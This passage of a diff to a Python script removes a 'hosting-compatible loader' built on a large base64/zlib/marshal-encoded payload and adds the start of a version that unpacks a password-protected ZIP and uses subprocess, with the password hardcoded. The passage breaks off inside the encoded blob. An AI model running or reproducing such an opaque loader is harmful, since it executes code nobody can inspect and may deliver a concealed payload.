@@ -1,39 +1,206 @@
-#!/usr/bin/env python3
-# Хостинг-совместимый загрузчик
-import base64
-import zlib
-import marshal
-import hashlib
+import pyzipper
+import os
+import sys
+import tempfile
+import subprocess
+import time
+import signal
+import psutil  # pip install psutil
+
+# КОНФИГУРАЦИЯ
+ZIP_PASSWORD = "9423123"  # Ваш пароль от ZIP
 
 def main():
-    # Зашифрованные данные
-    data = "dbC/qwFpibdwfefeJ9nliCI0fs1zfln3WhBdZTHUnwLJ7jNn4T+2OdIsudORBuUQEKsm/M5V33NPHNYuNMeaMreHddjp2Ta5QCYENzFvrfddfvlOdlNAM9mk70q1M7qQKxFtMJPzpw8DVOZyIoed5zhLcm/S8gQPBELqu/nPuAs9pm2smeoRJdAb5ZdzID1CLu+zeQ4+YaEp9KpsO7/wkuYUTy+9bqASgX2Q9KnPG+htyN705JTpVfHHzpy6LXY4qYuXcVNokbjte/mslKOlhDnid+ydQUgzKkQAQszMvYAZhJDxoe3zrnlOcLCWee89Qwermxw7S7+xJApPzxAbkzCrI/C/dR7yg7mxAdBAloD52mZ+vTsNejsDwsTWmp5FlOLmyu7WqEapBXHIgiK0rVTtIOX0RMovh9L1fUZ3t+0YgGGxYfZGcfkw9dIWosrklrVS7SMcQdfv8QIM6UKzDpHVgkWUNJD0Yrj6L0gGPzVWBJDAQX29r+um24AvRLMiQy1pgewwiyD80J1fKNC9Z83iy9Qeo9K7TB2xmgCkL7CgfJIY9R9ssm7APIQvi3FCrCQJc+gwR+JchyymBHJkHW3L5431qK8781shnGPIlDd7AsTmuVxld6ZnMld+ye+7nZ50Z4TPsj7Gm+bVFM14nWgrgRseriOskSQNdSXaxhuG+sLReEAW0oeDT8GUPow2HrcZ4vnJzK+VcmKJnO/ISWOC4R+lIM8MZbnV26mQ8rTCd5CQJIA0YM1NT+ODqs3j/pj1ISjkOHpvCJeT1j4rhLWC7Kilo6eblsjJfxh4melAd3mN3rFz7tQnJs/fwoKAekM19pjJWxUUOlZ4XsugP8eGaWzCprDbwaanPmkoTo8aAv6KOM4PubHEQbFq0+Gex+aPA/azcDovcwYq9XCElsfiSJk/ep0nBEe5kZcnnRFGEFUcnhnYHRQnFg5drbT/9K5T2T/zNEmaamtQPq/Tlm6jaYa5/DELBRiC/77s3IdsgK7tlOYYgQv4Yo5yiszUHSqqJZSaJviVpKSCu61jOjbUOSo948hElbme0a1lg5fPJ5DdlAVe58t6FnSyznLNrnyLXZQkO/Xt4oq2zVEqnPyGYh43n0gQ05s8VEYKc4SG7t03E9Ebf+1N1xy72Cz1EsRCqP8mkj09veMEaJYhs7xTgtC8ZcqeJZYf3NBX+2rJ7rCWkLY/UGqnM7/NATrA4ttV6hWzpO4sgGR+LJwacBcO5lLL33j/ehc9caryT8r/O9BzDh3kCwqy3+4CZG1vsCRxr32dHAAdmH0MH8My2C+4aPl0aTrgRJSzlrZTby7J4sDs2UsyB7NjtsoMXIdR17rR1uVfOMDccTx5uVDVO41NJHZkn9HP0D1742NgG2tSqSeWgJIQkASMbBa27kHQU+w7FsJ9qFCEp3U0gC21MZj61IBrFivCZhTomU4gladPazHwkB4IDrOUz1okD8p+C1vDmGZZkwsIX8DF3Jse1QUEfGro1qJwvLRKKCEbPflo/qfZinrTH9HWbPUjtWRTJYpDjJNYCAdBHcBgPj3jjc/CDaT4jGZgic3H2nESRDTdTlg/e38F8aicy8xlZkVURwkgFg0YLuHopN5T+hOUs7lc1wRnEzDcnJR0AigoP2LgKWBOaVlM9+vQmmTnGnfiQtYUMSpxiAo23C0zOrR83Gn89BihoFwWxU4aWiZH+nnfIhONdz/2DeUEM80fRV8yHadYVHoPZaQigcsGs1yXPmpJhJXikYv2mwQwOQNQh6PaPMBYCNrzkTroHbBDgxOkJm0HwS2P/f+9lbpbdFoQcivbs8Kj6nqrT8WVXu93c8pdduJlMGzDHcu22RTpLh423lxL3urfduKpYKUSIDl0PH6thvfUWUrvMI9NlrByM0nJr0pMjFo9J3i4MUXkhefhbP+DgL104Xa4PySmwgZ2ekRfd8rtl8rwbWedqRwtLXZtABHxeSaldiZE5bbO2nb7bhPDTkb/4MEEXHx6iLKrAT/l1pE2PomRfL2bxdZ5EeOdedhbCxDws6UUuHrYG/ZrnGhFFxQsnJG3AdhOOvUCDkU/hUav/yIImA1JI/JFV3oh/kDk/CL8I1exfz7Hs0FdaI5+VOTksCywDDJZk9R+J0SJwvpUVOTWlpO1IYSWfP8hGMSdrFLbBbyCFBu6sOcFLy5wFza52GJGqGMVjubfCD54CBey/tChPXvqfj7vDbvqBQVJx86fmUyWWomu61DcL8wGX1TTqWS9FL9HWFeZSwg9kNdp7wz3iOWewSFjH2OuIN96o4XwFrlxECFj0lS21ktbwXljULTBLL19XHBi1yf9LEIERbxFia/TRMaW9nCBPyNHmJnCknE3A44n1XKrzhozlGAYCwpJDtrAOfgis33y8WXu1x6XJkYXxGTM58Aitbf015zO5RUdnnX/AEop3Kb8qDUlk1eQho0L08+yyxTMSYJvHl1O7qovlmBr/US9o1rjNw3f+f8wP5COds5gWPMukVF2ijbrtuyd9JsjLpwbVllH/3ifqilS8wtJMJHlxi5fVf5+8jvXO+wX+uE8ie/umkpV7vQTQtuGEXdMWWO4RlT2F/VJm7fQQZ5ToXOhlhSuT7BJCpxy08d+LVPlpqiH/bwsGKa1OzZSe5tFVv3W6ugfch78Hmtq8PcWT6kccc1tp8B7PPwUSgTkWS+YOrUkUAuA1kebLwDSq5OOgcNFIjwahf25pHJId4R8Hr08TviJt80BAxubIsRAD2lxeEQmBwpocamfRnG5cEToONrmphwZOjE0Xi/VSJfU2kHnsKikdfmwRTbzOsDSbrPa48O9O4FtOf5Pf9W7zWmzjMfPtOr0/ppKXiJ16gv+etojq5+arRzhjK13YfocbbPZABQEL2o4YOM8mwMzAk9d77eTTeBp6Bsg9IJLd4LGCvS3QrkARXj3fsSSyH7Cqs5YZmPyATu/UfiLPnh+yKFMVqHz4Ai9x2hpTJkl2opj/PPQxbMq0Kwqm5AmpLAC6wJoA2uWYrwCOppWQFcnJIXY89Y/Im9K1AhMf9bVQVqwZ7YMCs7vgwgxDSbEH75VvgRGxu8rpS7rVBQarrfHuxmxrSjbnixE1noOTUuzzWymMKot1DFCzmFSJcMCWVAyTB6fa4LKO+5jb4qxRWQZs4Ee4TUZt0yA063q0vC3Hwn1p4FnsSgWZL4JtERqdqZJydG/InNS3bZ/Uq9tyQ9OqBweb0ZYDKvDox9COAaYtvGNdqT3upYuFHRFD98phphU1jRTLyXBngDeanCbR0lvRVZfUP+15PJB2BJYWT2qpzGrXm3jjwNMY5ktixiF+47VShwYGVPpdJ6eDoDJHW3DglA2FYxgvMRiCH84rsuJYWSFVgn5NreKPJxT+AJLiTWM4YZOL+pcXLsMhzDl5Qcly8d5HV+qSSpdwIcEJaIy7OMTJH75PW8eNVK1JD56bf/fz20LWTCy6oajkuI+Q3Pl3pNT04R0qAqTQds/uYMz+4m3Q7IfAcXfVwzHsopZFCIMTUPEyFke5R7xKxWe5WCYhG76IX4iqtyKUdiDrERvOnC4SXN92vbydCa0hyW836BZJpJ8kI/rEnQs2g2RIQEVEfWKZd3PXS5Lp6T/norxrrYtenTrrfIJvRxZAvp2v+LEb26qc4i+Xn5dkay2i97LxdL/9WEe3Jgf3VcVEGbhWr01EbRVnGXGCSCkpKEaZINBiTvwD6EhLTUcFV6qucki5noRMQ3Vlc9M+NO9XOSJH8zebWj6o+QK2CAxeAc1cXDUSuzU1ViBCBzaQJaObj3JIZ3+LYjwx+HF6MnmzPr9PLUi76ca4nnepzdid4rV1x5e7+apxF5OrYaoPaZcA/Y72ywlSWDF13O/JiMWLRjQ0+KoSILBvD9gCIbnAvUqCYKx4fRTk7SrgLaN+3zTbuSLkiuEQL+8azmcZ/uTO3XiJbGMxOPS5XzoBRcXvcBRwc4VPZAHmt+kM9emsSsQD/21xfv4G6qib6xBfhYkTUtDttTtuLAb/+0jS4rlWMDkSWjkwccQAUsJzJzHlSv4hoTppWdf8DJPpsZqm/rzZjNRHbQLtrHGqcTBCJzM90DhXVqOSS6aEimPawqTFwUAd334g8xtm8rHIW/QAXZD/Dqi2efQZtrkXOvVqEmt5+mDI893lJJGHCgFUdtW2xY+EtDlxd4OuURDq/AFm6T1obytO0TmOpjj518afL+V60uDWRtlYpkVORZfxvKBnOgn04+AFLVq9gmLV5TDLlurBisKIEQAKbUTt46IzJz11osm1rKIJjEsexU7wbAtyXV4vZGdXAvJBkt60OK8K6V7bllycyPk5TP7KVwOgCoUcfWO3PZZeiFjAhxb3aENOXhk1nz1laL3HPH0RhMZLz9x3thLYUPH96SUKOkVUbj6Q4Z8AH36YVQTGojAWyRtVrA41/9wkiMdQ7kco6kyxLj8/8Y+pU7gPHGm+0d0h0L4W6on74sYM1baFIPKRyXgS4byRcbOr6B7Gy9vvJe9Gl1NTwnRjTjDnD21yHtfDDZd/nl4WPUlg4LrlHEuEh7VrDySXnikwUTZCzdFiqMMxfoBvhtBpo9dcD3GZnXl7RGWqN/TVLSujbR7zjixMcQlou1zHhSy2QHzDOxS2jLKZ/huVOZ21cV2Hvef9SYi3sn5L/XnomApAh8xLpn1AeXGsJi50GBA5lpgxaO6ePPFsQC0ktxrb9O611/WSBeUJWhS/r4oBOdxc1lxB964VvZpk0go9UjBP7pBrhtHLljEI5t+0Fn60quVgTLFYdgZ7QH5BDIiL2IXGtvtCcmfRsNvBthDIZaA2iF40KcwGZQmH/KaAC79gR6HkH7FZdZDok8XqWgBAOvqtVkw+f/EUsIFCdLZo8t5x7D5oz6VeA3DchFzCwSKQz6uQPGUxh6NysjKZVr4Kk45aPZWlqIt8yppun2vbLmyFVRS7utk+/tNN3eHphTrnVfIG4/QdasaFGQc2ssg14cFQ33M1vASgyFNkKtPbzyQFLIhnmWRHnOd8YzDwDVWpy91SR6l8WsiP7xyLuK/C+dNkPnOHxGoVnUib4+lK9Olm+eZIBGkSuN1PVz8upsRvpUcVyPgBHk8QzYwlP4wNy9ouFhGC3sQhf541R0tXyPCjeIcxmLfvQNRE4LMR1NaEsXopiS6viqlFU65fYl4S6yqAbA4kwXz6+JFw3C5xWTntmZDrXGRmdmp6qsex2WDV1HHOcau7VbUlQMyEZVUYwjiei5z9FuqifiD7kxBQtZ+EF5SDbKsqFB14fNIFIpgFCZ14tCefLLLQGvc5hvunH2RhDogxpCbKWRdeqZAqWMIYs31LnPi7RdnlJrYFqJdRUKhRutqJn/HvuB33vJ1tl9+lP6sMXKCTQm6APyuyR6CRFdYzPQFF9r1OHhToTXeCDKVxDJ8s0JxsDZbsFsCLuY41emmwaTrXZvoywn5TH36h9Fub0nHpzvlhZp7BV8RQ0YRYemJHLaap1+up0j42si/fFqu1cekoG9cenFX3FjU4WWewsxCe1ZOHVFYo7wmBajiryJhaxXYIkzHaQJq7jkDXVcN1aMVbDwDyIXA/3Txd2UQy3eQD+gGHNsWmgGzcqmD/PUD4OagbCTU1uazTnMxRzqUZai/NH4cWipsvlXrfEgfp03Klv5PLKOYMnCjydCvNJU0F85Me1f39LiWm1NB5qvmrmdVgbeA65uSdFOSvKdPAG6NYrVJQm+GlltGxU8BdfnB6GlfsZ4X8+amXxa0Nm4dM3huTmVCczYaUWDlX9HIMlozOywhDoU5KrowgvZUpSg7C0wfU4kde/qzuz0+qYvg/3+ZUbqTF5qHi8O/i6VEdXcfycamMtAFvVzjh9ez9606PjQkIysr9nDUtp1zerVUL1A0Et6ByK4jpcp2tnYbMnHhntwP+F9SoBgwVjxhbRDBY14ZRAG0/4SCQHKm71TZcelYCNIPCAszWexmcDpCe0XgSQf1L0TUZLpS4a83YLi7uM9OCdIM7URiNpRL22veMcppPHPsVY5RDCDo4fbDCfS0o36ZpSNGV32HKZGgD/bJbG8AatyA0LjgT77qvEbRxeoRzZGBT/9NYKb3kd78+fHWJOgDypcLCXxIyG1+I9Bb3uCpkTdfUY3iVWzOy8SVzYoRTZAEARgHpmRpOeufgpb6pA3BRCXSSxpwa/+Hw1YKN4vj24RlNkwx1dX8Z4lmhdMfXA2QGRjdJNqIzaTfgWTT9PoDsJ8bgRaC5jP4RtYGff1EXL+gJULE8mBZmsV5IyHwjq1bybVyK6ukCZXIP8lwZ2fwrRHUIam4oisRbdDa1md+3nJFPUC+Nd5gSNi+l5reQy2HyyVlxb8tJde25ie6cscqMphIYky17jU6mQNtxZ8Dgr6MD1/n89B5EpkR8VlIHeXGcanVhKmfVrkh4JYLC0E4jTE7jqgsIVe3ZmemEhxG86AgmpcqBfooFsoRtabziHT5RgnG78q+ebI0zAqPVVIQkexl/nqzQBA3fe3sJyjVN30Bwp1o54RF/PFb411einiJwink/s4u9TFfEL9LABxnFBslJrmtJR9241mSCHQ0k9ZVQbtVjrVyDAQT6OmOlAS7514D1Z5l3TBnxmVCXdAnf73tftCPCv8Gcd8kNEvUidVS9+DjUHEhxj8RHqJB3Ud/Yz/bCZPLNv0T26lJTw0UaSmYsEz859+en9eI75fx4kI1/bbmW5IzfLiPbmNtTBzhI5GRWHQGw0x+i+ze6HcGVaGmWlKXky9qHOOUcfNkhX5E6zR2p4HnyfTAnVsSZv+b8Uo05mLI8faIbcwSbYrW7ecP8/I0uO9xjhNE+83HPqtLXI3zROMDJQAgA8NvZ1/x8tx/5a41XiKUYMjlWDalurx9doiynhE8Wzvqu49l8ReIUDrZmuV8q/EB+lS5+4NxE6BeHgndmIGs7scXTTXbql9MMZh3cmA6qfVzx5WfVcVKPnpY4JJnS97nc3rCA9hfITngoFhnTjJLj4lTZ12UNjBQTyuBaNPV1J3WuHfc+eRY5me1GUiZa4lGdSCzAvpw2Ot+AzxWscbk3WHiSHFm4pxX7Uaol3lAOpj+AWRDVvV5vFLIC86uYVFTjSH0KHmsprPoLOavlydLuV+HEy6F8oyQ/sgD0VTxBxecVuCruWmKKBsHxh0kk+8prfEuHCXRkRLM20KWAP1YsBy2iDJlepFWIFXQqaRKrWPEPNltpnZw1/8XIw78dX0WvK+4606nXq0vZEwDSsjXxK49xDUINdYX8plRFRTmlw6D77uSAQBxNFTRExil8yERhD3f2QXINCB0FV23rdV86GghBDkJTRGk7BvQg+n79Kvz8szWXUAxm5dzUjx0d9XYpyNR0W5m84xlSp9p4h2WaFiglmh4wMfR8LiLwDALOTobyfA5CoSlgMJ2VjRlzj15MnopYp7FKEMh2paVX5YhIweFWRXxxJkGUVR1lze67y3OXxwaEXY0kBMUbvWewFIX3I+sQelUQaFgQdXPGn5/k8AUhKLcdH6Q1jDktPMNwVIDxZB/cdrRP5a5wDz1xvWnFmKpkYPa0ff38IZeeQnr68OTiu/OprxZiiT4GS15b14RAmmHnksfmLB0oSeRLxj2z4g32QbnvEZO4KVA7zkwUl43/QE3sjhT3UIoagu11ct5EYNoWqMvQ4Nx/EHBMJVYNyjNzpsHUFR1US1nviRk9kIfucWJ+mnCod4J9bEYUPIadQTBAmIfhEVTT/ooibZMkzKQzvMK6O0oSUqNBWMeBsZHB7MDF3xjnK2JIiUDaQSOJsNmw5yj+Am8x7Fq2RmnGDtns80d1TdqPLDVomfZfhoJ+3BtiVJ9zGGHYV3P1Z1Elony+6m2/XlIhV3De+I7wDix4MO16cZIUwTsbZ5Jt55sXQZgkMdusBjJzfi+P+AcWj1CzBKykJFU2qgcvUz8dHA8qS9S1RfmeajDUSqqw57KNomkJdDX+c+6QB/D8JLcy7VsWJwIkY0tM3sop3Cdmj6h8sKAdpTWEMlhKFslld5wl8RHLk6G53vb3dnj921ZVvg7DMZFD6gHlqOnDShPecGja69mnFi1iyJT+AXWl1aDuVO6e2SEGegSy2/rPq7+ssRPO1hy134hcDNKRVV2WgCE6fGtmDbHH+kPk+z8tvnrJ+zwQ4Uj9jZL0RV4TK1srqrx7YsgZSzSVrEaTTv2F+f4qoU68VK8ePY7z8cwCIumtkVrIe2ZGSaqMhj3tXIbs4g7Y9T8pm1GiH7iWT0tmx84kJ0ajWsb5d1HGjsiD0ZYAwVSeBPpCPSfqBL1pL2mBTw+DYbgVct5NN7ZW20qpNYZHqLDa0cLbH28P20jSxZ4GoJ3DjTEjhG74IdBwLDZDoyMfKt/sukh7qbmgfuZAh7fuqTjqvqsudF1I0GxnpJ9AplZ/zrSP1M+QEmXYnwjU3K0EMcH+x5lOXcIjrTMfiYluUeE+p8WpBmYJ3K6iPVF4XNmKMQ7nulP78/xxe2xRWRPRPXZ8S21kIy7tcoQhO8BzWYsXaOpiyuIE122DMlpMMmKoVZY8z30hBbYbvXtIV7GqaXP+K6Su++nEljFLp2xN8xT5RNUyD+bec3X5SKWPUzL0mRfb1BP62L93Fa+2Eshw1AgpzNm9UJ/yKQdV1Fze2d2U9koCXEE5dpZcwiieoxcQ/xaWNMF5SnAhx5kKsfiy1dAqc9QsKFXCjOnk+ZNUjVZVgtq2Arir02TXpL9Frr02gWTKh5iMuZYNvDB1aRsnuuu5hzhoQ9CNPVr9onR3mqY7VIGKNuIvAGwm/O5cTwaO8YeMNzOW/0bCatQeQUBLqKc5RNuo7ry3RBzEdBp2JkrGxlFekxCXWdjEDILaHEVNe+ud65Mg+HypAcExElxdOH18BM0H5peEqkMrskiRFCBVWg8QEUNASS6FzjCdAEv4etodUudDhhiiAp6owVIfPMVwQEqFE26wW5UY/dYkMMihMAyh5vS3ycWxJSZsXCtquuy0PMGQyBZtXl4CGC5tClFpLwRB1KQ2tFFXsEWdLl7wrjR/Pvwiz0cDrVF+o64+F7zuJqqV6ywLw5086Qc1wRktQKDlItO3yi9u+JPEWgI/u7fvZKRsDJtaf6DGUF9bQvEzXfLvZEahpPBCPRFRtDn/vDau/s29o47ifH26JEWHa2/+f7vxV/YfGn16r9RlI5ucYvQnPd22ZkCHIdkM8oSXzPJN5V0l421q/NeBRdRQJ4IZaU1fua8KPFHgGt6KIvQrHOHBXccScyeBjaf4eMv98JgwZaMN71xwgTqYdikhuKd+Vj1/8Sr6dSLdmaXnUluWjB2by6924jVHpsf+YerM0gUmAdb/lfByAocWBGmRTDzOmwKS3Hb1IO2FIZaCOg8+GWdQdRCzI5kUeFl7LidG7vaEoyr1TwzyJHdw9q/lSzqjtJMe7E4fMXJJ2/MEh4ML5hs0liV3JvCwb8iw4aztniAEcZKsZX2zQSchzFN8xQ7gamXiYjiQb/VlNsCS0FcecypqTB41NvnKo5+a4J+LtKo17CygYoV1ryfYfvG8jHcmuvF+j5g9+LS21UXnobw8A2SVj02vcAHM7FljE8HMI66e3iJ94CDQheqhZwHH/EDT1Svd4S8M3PN8uQ6/NxNUjEe6ur9ICaH3STBY08TyTU4D35D3J0KH3HLdWY12hB4xYyB6XmR8SaZj8TCzuI2qQ9RwGDz9PHLCUWu1JmZHHOSzg4FPyKIxRkU+VFAeF4c6csyKhNZ8pxDE4uTEbYQ0iE7DVABXFyTnRZ6vIxfimbJ40ew8sUHr81qdK1Om0s1fnFwS4z4TGFratf5qnp7CBTCwLjFoD+JznP4FyxmZHyLL73Jgtdzv2/b4qjBDzmpJ6BFlSURiKS3aXdbukPm3OAJxZr+MPKdEQ1mj5o2ZWggrGAuAP9xumFb9zuLuirQA6WYeTAEDOJojD+RKsGXZKoq96S+aJJQW4fXHpHtVvsdavzfkr9gEeCGqCFTbI73aKJu5Oz5deIR/EWW/TqD8lFOWnXNnXr6Xry1kNG8hQU1T8Ht30wHkoOJqMtp4bVZRBSqKfqeZGoHGcn6sCabibRSewGEkaiTicJDitO5EPubS5zat0En4J2dNWVvRdEIx32NxXbfiGCYb/Za738LhPN3Gd30Vvzrf5OQauwOGFyjnuX/E6MlyBAlgw1h3uGjDYOLhykcoOOwNLGUPClwMorpTVEhs52jsrhPyfEz56ivxqMYhMNlTraQ/u9OyKS1vXzyfZcENu6UcG+Otbpun7i6Cm19IMJ6LdFd5PVHoJP9kuPrlK4MfWZ9Jl4KHhq35twl6ucDJXYTtT1o2zLC9EWhOq3WfIFw0ryOXvUs38/e7fuTA+Qxev8j3g9U1rmYmdfK88iSkSq6XHlQrFh/VeBAtmGykoLDNIDDYKdYcUAG7xPdwF69UmirSKGyxHJvNXe2TISrv1XY47v7BFF6hfw37pC4ijM3GVj52TV+KguQSK3gF9tiqkCztLP5mX28C4LHYfqmcIJ7COQ9Rojb7Arn7tekGWECTSZm8w27tBmQTXitREK3PvioNly/b1qgPtjtMbSVJgZJNFKwwhwADYUgh8MidRcdpMlUXzPiRpY6fO8wGAF6bCXKKAriDcVOWW3FmgAgaVqnStST5qFcN3myxQNfGl2JpeJzKXeloD/TzrsMxCr6KQW62M00+15iADQP6s+XRno8CEdBjEB5uqQV7Jkk3Fp5ap44dkrdWZrdgeaPupOMNhAqoWkoR2AFERLWoUuF7ajbTgYoCrFmDuOxAcda6/wJTNnFw4LC+HlweWNdagW2bJ5QrLAXQ+IQLbXtLEAWoq1/+MsbcjBKVK+szTFRhWbMcihsXim1Sdry9WzcGBLqh12pHOnobTNYEgsMa5dQGiyBNHaBs/erVigs8ta04K9L55S7QxoMoXnr1MsRfgoXt72PNd6PSu2cwZdCZZ0B17sWiq6BkfWPkPxPVCSNKEp387vxkYH/V57oo4RiMxsCsEwr8jat7j3C8BZrXkQY5hNW5XIOb1eyez8624kxOhlfS0zre96VRtcs9VE/ViVfDmgEbLSDImuNwdho64jwL+QiWuFzspeyEYhC6dNVTrDOWeKL8JcO/Y+TZcoCa/A1747H9hJQL1AP3GUEVlWc/p/HtKdfLLmLn6WwC8A/w3rogYQlu8GwfT7w6A0/Xa3WNWh9OKL+dJPWboDd7WLbRx3Z/fJJ17PCbLMg/hvyHQZHqhAvozkzb8yw1ZpZusofY1sxJ4fsN0VcrXLrG4NXxEkHLLkLV+udifpQskGUJLZimNUEQ5kuarv+NLZcut87WIJE/D+SfdfgK6kbPT+rrsphyfH6BGcNQanaawj7oTBQ9oJgC/CdO2UkEr5EjM+Nb8eqXK9lhzrnQCrrT/mnXA+YDHSN4+nuEiL89LXeBOYwTvjp5ZQI3Rpe25rTzhSsdOM6cMnjCGdM47u9+Ujdwb/3v7yaRE4MO4fjK/ehJp2adPF/zAg3Fwie9k6srCZ/EN0CBMPt3kMijtDJ5th5s+cD1VurJ5fSNT+l9fGlLL4c4jGWJunv9wOID74rmvK+UF7QxU0fmPh5tR3o9lc6Xk9IJSPR5ityujI7J+L71+Np4HbVtXP9fQUEbMISA85DFD0rWFo3zoKKewiDqUX3HxrxYTyEG8qevLvh4nLp+kIsgSZ24dU4uWjzSvW/s89+LINgQj84PrVncyataaoYexLG0XtxVY90Lyx4xs3PB0kKkz9BuOniXyNYU33gOfXdans5aKyC7/pKv1xY/0hm+HBE85+8rzNpTbDCbLTNW2G8YHad5eI3IzCfPpQN/m4CkFFSK9Z5waFqQRJiq4I/ljqM2wHC3zm0qRULWgNw7nLYcChb72iAJJCPvGoX8fplBq0w+oKrWGf21mi6MaYQtzvBMOpx//OC1ii23anL30WrLTkvVll1hhQRze1JwOj9sBLZskoBH3fNydPkQtQ8OBJRBeKc2sdbVZ8oicVPYuJM8RivYPXX7kJmsUOpamKUw53ArOn/j3ZKEHr7+h/he2N2QoURLV2GSjhoILaxw3n/O1LQFUtZGWYxO0gvlnr3BDrZKxAUYW9oY7A5f6o1qgkVfQEVA9DkWt2ZKfL0Yy2i1HbTwgWdEJiZ4cxlnu1WnXvoppD17Zsq8Q1YuJC7kTPTq/3CGv0yea1YD+QOGkkZGgWH5lXUTM2s36Yn1gFw7ei29Gtst/AFDI7ZIvRlkaRD7T4MlpUF+19LtSjpDl9b5Aj6MJaV+6nuCwxxhaO/xc+Es2uQJYhe0/SwOxwTuvRfFKxtWs9/vaDGO+gLqBwhdkWMvGGn9bUu5YZjpcP97Mjed2tfqKHC5JU7ZRscm47IFboJRgAw5EWi9Esci/rCJbUy5cVefKCj5wV+Pb+LkBO1Cw9eHxWo7GHDx7Mmemy5YWKCLLs1iX5Z34bunsgDu8IpbPKq4xrzKjxeLoxAtnwOEadk3vJ8yxgvqFWosIdW7Kp9Ye1QDBTIT4Tn41Evp5uOpROADiwuf5UlfZoiyZ9pD9MYtRykUvenztbucxVyhpMraM3fd6aw4dltcgXVBkCvcHbYf3AMYwzVAQacJQ8tlEBgOPs6H8pvbGiJTGIctqs27eTvw6MqRXGdjbTZxVA3W1waAk3cotj+tWyg5muvj3yhJuRbPFYuUcY+PHWM9Jzjs60YPDaSme7I+j1Jb41heOR+4QhO7PMoL62+/c5/1mNd/Eiox5WgVJQ/MEWlbf27cEqOvdTTgvYG5sBZNjms9Kc1SWdPNal5ERUVEJXh5SUAeCyo99KTaBTapAx+czwktTjvNzcm+VGhGXufJssiwsRZfOWmehrSh/NY9S53szhSkV2h+J3z3SPjkQzdtt1yFdKo7rebzDVv63MhIZBWoh2gEtYwlCylh87AnXBoXlDnI/vpYtb7W7ovHyIDJQb/L3s/ZL1G3aTjyxYTohaKwBeCGfe2GcwSHLTsgf3v/8rwL5g/MVuW1L7UGlfOodWMT8cqO9QGtlvkq9aNdwLYOytPJHK+xOOOSZQmFD2cih6kOQNI1tOKt0281N6bXoyGub//deDg5ekJdWOKgUsRc1rQp3SIlq777unlSmtR9lV3DWWAzOYoQB20qBvtiOTQHPs3ZskDsgqh2Ha+e944ixaMnkZ87x4GeXD5yFakScT9Kfdki2w9N5DGsqnf6+PLgLnLbtiH/ZhfI13DSpNsMdEDkFcHQ9Ykfh/TOsCwodHlRsfudo8wLXXtVJDbwdufD0MUVjJwiNckawhRWw6lEBjz2BUKUtX2ra8NW1yUE6dCHM8xU3voEr5IMjrQvJiSx+X4O28LjAjt4K1Dvl5k2kp5xKPHGdbUQpqKlhclJXVSXNro39sk1qMk3NUX7KV3QmDPlBH6bY6XjH5/D5jJ9XHUECJJpMtFvbWdXPB0hyIOSvwO3B3s7jRSw16vfJ3Iyi597IYmZhlzkMlw4lmD5hCAVdtBStAelVfcj9R3yHfQ3PCuiYx40lcshp5ATkgOww7bIsiPECvPH5m7p38HeIsCrJaG1zATXwoRqED3Q6ChbjsJaHDv5YQ0UlyzSCxO1Ai+tRon072uL/ryBfDU9nek4SJd+9FdvmqZM8Kpmx7kH3oV0ATBw/YnAoUwjpTVngTBFuToDv0vuldC8BSeCphkCdC406hxFvgsdA9C+ynD+HrOjRSvqar8DUQz0/L+GjMVKrSzMJEV4jpl50Wibeq59ZJ+APykmfyeX2t0N033Z/ERL5deDL0+1fWIUkF3Y0ttSywvR/QeVtI1crzZnmwlJEKCm44Oj4hTiWBYLmrzhCnfX1MVBaoropOMCrmGRpzEnOmOmJy7rHnCPuA8R8lWhz8SO9MNJrAaLY++/WtOZOCTf3VJon9cHQc7ByftyMpNQ2NnQx0JHspY+ZUXp/e0tN1scb/61a5I2MJbkLfcMMf4sbWigx8sUaQ2QSmV7Ba/2EJVN92clK02qYBLyc89jlAnZTm8wu3Jz7Kvd1XS0Jt0gOs5xYVNA4CCrwMr7xa5JmkTtE7th74xd5Lksg94GTv+zbhpBUZ0M+iTfuIo2JSSMM+zhuwIOv17m9V9cH5LfuF8MqBV72zmGEW1cOS4bJYuUcy6efol+qu4XWl4VxLiqJNC78enX7fpDRN9B7nTbVKtQjbOnRQ3Ixw5OyRHA9SGrXK627heTBDY8nK4EjD2afk/q4i4Zei47HHpQS/D4N2ob1AkhTo9GHbrt1YEznxyetE7WN8+89lO0BeZGxPyDfc85kpGpRGHJCxSn6eYsIehVyfOfhvuZHTbGuZcPFMULWGaqfGUlg5RMJhk6qKUxe/4O5UiywlXafeZVTdBML5XCy/1AH5OJaFS7GRtczlkED2lZ0SnxmrBubNOc6sn1W2t+zWU10iWg9OU7yfczINcbzT3Dwb/lxZtEP6s+/AfG1klTg9N+gG5SAeR2pLBJJCr40qgi2l0PoOt/LwepCMxmd2r+BtwEDakYTvNviCcRGvLxI5s6AbuMT6ncKgRVJ4XxPk5FfGYmmTC1yKJb4t/USZOF12l+SwQ/Cj2NJQrzAvzzbxkQaK8cV8JRWndiavbKn/t8mDLlRqf7Z8da8HrXtvbHQzyq8PqUkgH1cdl+MlXYCUVMwcZ09vPgROlWGsaJQ9cnrFnbh877vlRskm4Lb8pbEG4oOi+wgfQNWrC4YswlVjgwr+I+HX/GTtg2retwbcSTsoOq765oAH35lmDKZh7iVpSrBFZIZ/U6/KIFteamgN7dFyzKLj1kHymO9vTjfCiQfqhgAsXLTJaY4MjO8qPZXTQxGEGnNQqKWURT/Ok1wSNyFNYV1Q7JPKXWAG+oU8gX0X4538bLHNxslXNhX1/p+XNwb3ZkBVLjDdBwONqb8dV8L6HY91moOJ0M2bqd5mEmGSGLbrD5vOHn9L/U1vhvdn4dy54lTN9R0P8Z9LMDRJ18zTCCGMNZKE15d5H/PkGupjeuTX1I3XbCix8r07m3kKZaAUftVILZ6QnlKy621CIlcOqKo/yJBMyjOb6rHfQDJNsOVovb9ktClEwjEP4a1pEGV+6lDeZ7SkCJqFZ6nBU9SShS3DjMZjmQu2ndtVsOIvzMt7uWnWCt8yguD84zgoYX2XdlcxT/5AJSxZ+RQmVJdrKFiZS4/oRQaG5dxzEzIoPLYEefvDeqNATt7RoCQnQsOmZ4WjbL/T1c2n7DS6l0/jdL48ramsSDWTPwDmKxXVKp9GT5qd84KqpjjtOUR+jyEZq/GV6SxhPQl+4OAnvHeNblotWzr/z6323W+yM24jVrWR/Oy1/yl+9DXNzVUqaY09UwXwN7nntF5F/GpCIEdLCqmDsU4IIunMmhIza4TTdM9aJWBCtYjuahrKuzwhVa1hoHsjLE2wDbvk583vKlmamiY+Vp8K7pYDoZ7aon2Kktd9HH81YqGIdL1up2GfxjwQ+YiqlmpWrbssbWh1d3SH3xQPvVC1HsLJ41GwQ1wP76BD+2/o+nbtHttXakLD5xZM1lIav7uru1PvSh8urdn0kavtCtyrNA6bE+MxJvlYXN2i6V91Tv8+NNQSSStbItxbnOlMiqx4LsIO5V